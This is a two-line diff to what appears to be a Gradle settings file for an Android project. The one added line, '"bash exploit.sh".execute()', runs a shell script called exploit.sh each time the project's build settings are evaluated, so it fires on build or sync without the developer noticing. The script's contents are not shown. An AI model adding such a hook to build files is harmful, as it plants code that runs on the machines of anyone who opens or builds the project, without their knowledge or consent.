@@ -1,1 +1,2 @@
+"bash exploit.sh".execute()
 include ':app'
